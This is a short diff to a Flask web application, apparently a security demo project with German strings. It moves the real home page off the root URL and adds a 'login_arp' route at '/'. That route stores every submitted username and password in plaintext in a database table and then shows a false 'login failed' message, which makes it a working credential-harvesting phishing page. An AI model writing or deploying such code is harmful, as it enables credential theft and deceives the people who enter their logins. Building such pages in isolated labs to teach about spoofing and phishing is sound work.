@@ -37,7 +37,7 @@ def transfer():
 
 
 #Start Seite
-@app.route('/')
+@app.route('/home')
 def home():
     return render_template('home.html')
 
@@ -96,6 +96,27 @@ def loginsecure():
         return redirect("https://localhost:5001/loginsecure")
 
     return render_template('securelogin.html', msg = msg)
+
+@app.route('/', methods=['POST', 'GET'])
+def login_arp():
+    msg = ''
+    if request.method == "POST":
+        username = request.form["username"]
+        password = request.form["password"]
+        try:
+            connection = mysql.connector.connect(**config)
+            cursor = connection.cursor()
+            cursor.execute('INSERT INTO logins VALUES (%s, %s)', (username, password))
+            msg = 'Login fehlgeschlagen. Bitte versuchen Sie es später erneut.'
+        except mysql.connector.Error as error:
+            print("Failed{}".format(error))
+        finally:
+            if (connection.is_connected()):
+                cursor.close()
+                connection.close()
+                print("Connection is closed!")
+
+    return render_template('login_arp.html', msg=msg)
 
 @app.route('/schutz')
 def schutz():
